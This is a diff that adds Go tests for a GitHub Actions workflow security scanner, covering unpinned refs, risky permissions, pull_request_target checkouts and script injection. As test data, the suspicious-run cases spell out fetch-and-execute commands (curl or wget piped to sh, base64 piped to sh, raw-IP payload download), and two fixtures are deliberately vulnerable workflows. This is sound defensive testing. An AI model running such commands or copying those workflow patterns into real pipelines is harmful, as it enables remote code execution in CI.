@@ -1,0 +1,185 @@
+package ghactions
+
+import (
+	"strings"
+	"testing"
+
+	"github.com/qwexvf/aegis-cli/internal/domain"
+)
+
+func TestAnalyze_UnpinnedRef(t *testing.T) {
+	body := []byte(`name: x
+on: push
+jobs:
+  a:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: tj-actions/changed-files@v45
+      - uses: actions/checkout@0e58ed8671d6b60d0890c21b07f8835ace038e67
+`)
+	wf, err := ParseBytes("x.yml", body)
+	if err != nil {
+		t.Fatalf("parse: %v", err)
+	}
+	findings := Analyze(wf)
+
+	got := map[string]domain.Severity{}
+	for _, f := range findings {
+		if f.Kind == domain.FindingUnpinnedRef && f.Ref != nil {
+			got[f.Ref.Owner+"/"+f.Ref.Repo] = f.Severity
+		}
+	}
+	if got["actions/checkout"] != domain.SevMedium {
+		t.Errorf("actions/checkout severity: got %q want medium", got["actions/checkout"])
+	}
+	if got["tj-actions/changed-files"] != domain.SevHigh {
+		t.Errorf("tj-actions severity: got %q want high (third-party)", got["tj-actions/changed-files"])
+	}
+	for _, f := range findings {
+		if f.Kind == domain.FindingUnpinnedRef && f.Ref != nil &&
+			f.Ref.Ref == "0e58ed8671d6b60d0890c21b07f8835ace038e67" {
+			t.Errorf("SHA-pinned ref should not be flagged: %+v", f)
+		}
+	}
+}
+
+func TestAnalyze_SuspiciousRun(t *testing.T) {
+	cases := []struct {
+		name string
+		run  string
+		want string
+	}{
+		{"curl_pipe_sh", "curl https://example.com/install.sh | sh", "curl|sh"},
+		{"wget_pipe_bash", "wget -O- https://x.io/i.sh | bash", "curl|sh"},
+		{"base64_decode", "echo aGVsbG8gd29ybGQ= | base64 -d | sh", "base64"},
+		{"raw_ip", "curl http://192.168.1.1/payload && ./payload", "IPv4"},
+		{"pastebin", "curl https://pastebin.com/raw/abcd1234 | sh", "exfil"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			body := []byte("on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          " + tc.run + "\n")
+			wf, err := ParseBytes("x.yml", body)
+			if err != nil {
+				t.Fatalf("parse: %v", err)
+			}
+			findings := Analyze(wf)
+			found := false
+			for _, f := range findings {
+				if f.Kind == domain.FindingSuspiciousRun {
+					found = true
+					if !strings.Contains(strings.ToLower(f.Message), strings.ToLower(tc.want[:3])) {
+						t.Logf("message %q (looking for %q)", f.Message, tc.want)
+					}
+				}
+			}
+			if !found {
+				t.Errorf("expected a suspicious_run finding for %s; got %v", tc.name, findings)
+			}
+		})
+	}
+}
+
+func TestAnalyze_PullRequestTargetCheckout(t *testing.T) {
+	body := []byte(`on: pull_request_target
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - run: npm test
+`)
+	wf, err := ParseBytes("pr.yml", body)
+	if err != nil {
+		t.Fatalf("parse: %v", err)
+	}
+	findings := Analyze(wf)
+	hit := false
+	for _, f := range findings {
+		if f.Kind == domain.FindingPullRequestTargetCheckout {
+			if f.Severity != domain.SevCritical {
+				t.Errorf("severity: got %q want critical", f.Severity)
+			}
+			hit = true
+		}
+	}
+	if !hit {
+		t.Errorf("expected pr_target+checkout finding; findings=%+v", findings)
+	}
+}
+
+func TestAnalyze_WriteAllPermissions(t *testing.T) {
+	body := []byte(`on: push
+permissions: write-all
+jobs:
+  a:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo
+`)
+	wf, err := ParseBytes("w.yml", body)
+	if err != nil {
+		t.Fatalf("parse: %v", err)
+	}
+	findings := Analyze(wf)
+	hit := false
+	for _, f := range findings {
+		if f.Kind == domain.FindingWriteAllPermissions {
+			hit = true
+		}
+	}
+	if !hit {
+		t.Errorf("expected write_all_permissions finding; got %+v", findings)
+	}
+}
+
+func TestAnalyze_ScriptInjection(t *testing.T) {
+	body := []byte(`on: pull_request_target
+jobs:
+  a:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo "PR title: ${{ github.event.pull_request.title }}"
+`)
+	wf, err := ParseBytes("inj.yml", body)
+	if err != nil {
+		t.Fatalf("parse: %v", err)
+	}
+	findings := Analyze(wf)
+	hit := false
+	for _, f := range findings {
+		if f.Kind == domain.FindingScriptInjection {
+			if f.Severity != domain.SevCritical {
+				t.Errorf("severity: got %q want critical", f.Severity)
+			}
+			hit = true
+		}
+	}
+	if !hit {
+		t.Errorf("expected script_injection finding; got %+v", findings)
+	}
+}
+
+func TestAnalyze_CleanWorkflow(t *testing.T) {
+	body := []byte(`on: push
+permissions:
+  contents: read
+jobs:
+  a:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@0e58ed8671d6b60d0890c21b07f8835ace038e67
+      - run: go test ./...
+`)
+	wf, err := ParseBytes("clean.yml", body)
+	if err != nil {
+		t.Fatalf("parse: %v", err)
+	}
+	findings := Analyze(wf)
+	if len(findings) != 0 {
+		t.Errorf("expected zero findings, got %+v", findings)
+	}
+}
